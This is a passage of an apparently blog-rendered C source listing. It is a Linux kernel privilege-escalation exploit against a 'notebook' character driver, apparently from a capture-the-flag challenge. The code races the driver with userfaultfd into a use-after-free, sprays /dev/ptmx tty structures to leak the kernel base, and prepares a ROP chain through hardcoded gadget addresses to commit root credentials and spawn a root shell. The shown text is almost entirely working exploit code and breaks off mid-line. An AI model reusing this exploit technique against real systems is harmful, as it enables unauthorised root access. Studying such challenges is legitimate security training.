class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tty.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> tty_struct_size 0x2e0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ptm_unix98_ops_offset 0xe8e440</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pty_unix98_ops_offset 0xe8e320</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> push_rdi_pop_rsp_pop_rbp_add_rax_rdx_ret 0xffffffff81238d50</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> push_rdx_add_byte_r11_0x41_r11b_pop_rsp_pop_rbp_ret 0xffffffff8170dd41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> commit_creds 0xffffffff810a9b40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> init_cred 0xffffffff8225c940</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swapgs_restore_regs_and_return_to_usermode 0xffffffff81a00929</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdi_ret 0xffffffff81007115</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdx_pop_rbp_ret   0xffffffff8103658c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> push_rdi_pop_rsp_pop_rbp_or_eax_edx_ret   0xffffffff8143f4e1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rsp_ret 0xffffffff810bc110</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ret 0xffffffff81000091</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prepare_kernel_cred 0xffffffff810a9ef0 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mov_rdi_rax_call_rdx  0xffffffff8270747f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdx_ret 0xffffffff81358842</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MOV_RDI_RAX_POP_RBP_RET 0xffffffff81045833</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *page;</span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">pthread_t</span> monitor_thread;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *msg)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerUserFaultFd</span><span class="params">(<span class="keyword">void</span> * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> (*handler)(<span class="keyword">void</span>*))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="keyword">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">fault_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> idx;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">    <span class="keyword">char</span> * buf;</span><br><span class="line">&#125;Userarg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> note_fd;</span><br><span class="line"><span class="keyword">char</span> *userfaultfd_buf;</span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> note_fd,<span class="keyword">size_t</span> idx,<span class="keyword">size_t</span> size,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    Userarg userarg=&#123;</span><br><span class="line">        .idx=idx,</span><br><span class="line">        .buf=buf,</span><br><span class="line">        .size=size</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(note_fd,<span class="number">0x100</span>,&amp;userarg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">int</span> note_fd,<span class="keyword">size_t</span> idx,<span class="keyword">size_t</span> size,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    Userarg userarg=&#123;</span><br><span class="line">        .idx=idx,</span><br><span class="line">        .buf=buf,</span><br><span class="line">        .size=size</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(note_fd,<span class="number">0x300</span>,&amp;userarg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gift</span><span class="params">(<span class="keyword">int</span> note_fd,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    Userarg useraeg=&#123;</span><br><span class="line">        .buf=buf</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(note_fd,<span class="number">0x64</span>,&amp;useraeg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit_userfaultfd</span><span class="params">(<span class="keyword">int</span> idx)</span></span>&#123;</span><br><span class="line">    edit(note_fd,idx,<span class="number">0x2000</span>,userfaultfd_buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_userfaultfd</span><span class="params">(<span class="keyword">int</span> idx)</span></span>&#123;</span><br><span class="line">    add(note_fd,idx,<span class="number">0x50</span>,userfaultfd_buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">serial_icounter_struct</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">                struct serial_icounter_struct *icount);</span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> idx;</span><br><span class="line">&#125;Notebook;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    <span class="keyword">size_t</span> tty_struct[<span class="number">0x200</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> tty_fd[<span class="number">0x100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line">    note_fd=open(<span class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">0x200</span>];</span><br><span class="line">    Notebook notebook[<span class="number">0x10</span>];</span><br><span class="line">    page_size=sysconf(_SC_PAGE_SIZE);</span><br><span class="line">    userfaultfd_buf=mmap(<span class="literal">NULL</span>,page_size,PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    page=<span class="built_in">malloc</span>(page_size);</span><br><span class="line">    <span class="built_in">memset</span>(page,<span class="number">1</span>,page_size);</span><br><span class="line">    registerUserFaultFd(userfaultfd_buf,page_size,fault_handler_thread);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        edit(note_fd,i,<span class="number">0x2e0</span>,name);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        pthread_create(&amp;tid,<span class="literal">NULL</span>,edit_userfaultfd,i);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100</span>;i++)&#123;</span><br><span class="line">        tty_fd[i]=open(<span class="string">&quot;/dev/ptmx&quot;</span>,O_RDWR | O_NOCTTY);</span><br><span class="line">        <span class="keyword">if</span>(!tty_fd[i])&#123;</span><br><span class="line">            errExit(<span class="string">&quot;ptmx open fail&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        pthread_create(&amp;tid,<span class="literal">NULL</span>,add_userfaultfd,i);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fake_tty_ops_idx=<span class="number">-1</span>,rop_idx=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        read(note_fd,tty_struct,i);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> magic=*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)tty_struct;</span><br><span class="line">        <span class="keyword">if</span>(magic!=<span class="number">0x5401</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(fake_tty_ops_idx==<span class="number">-1</span>)&#123;</span><br><span class="line">                fake_tty_ops_idx=i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[*] fake_tty_ops_idx %d\n&quot;</span>,fake_tty_ops_idx=i);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[*] rop_idx %d\n&quot;</span>,rop_idx=i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(fake_tty_ops_idx==<span class="number">-1</span>||rop_idx==<span class="number">-1</span>)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;fake_tty_ops_idx or rop_idx find fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> uaf_tty=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        read(note_fd,tty_struct,i);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> magic=*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)tty_struct;</span><br><span class="line">        <span class="keyword">if</span>(magic==<span class="number">0x5401</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] uaf_idx %d\n&quot;</span>,uaf_tty=i);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(uaf_tty==<span class="number">-1</span>)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;not uaf_tty&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> tty_ops=tty_struct[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">if</span>((tty_ops&amp;<span class="number">0xfff</span>)==<span class="number">0x440</span>)&#123;</span><br><span class="line">        kernel_base=tty_ops-ptm_unix98_ops_offset;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        kernel_base=tty_ops-pty_unix98_ops_offset;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] kernel_addr %p\033[0m\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line">    edit(note_fd,fake_tty_ops_idx,<span class="number">0x200</span>,name);</span><br><span class="line">    edit(note_fd,rop_idx,<span class="number">0x200</span>,name);</span><br><span class="line">    gift(note_fd,notebook);</span><br><span class="line">    <span class="keyword">size_t</span> init_cred_addr=init_cred-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> commit_creds_addr=commit_creds-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> swapgs_restore_regs_and_return_to_usermode_addr=swapgs_restore_regs_and_return_to_usermode-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> pop_rdi_ret_addr=pop_rdi_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> pop_rdx_pop_rbp_ret_addr=pop_rdx_pop_rbp_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_ops[<span class="number">64</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_ops_addr=notebook[fake_tty_ops_idx].buf;</span><br><span class="line">    <span class="keyword">size_t</span> rop_addr=notebook[rop_idx].buf;</span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_struct[<span 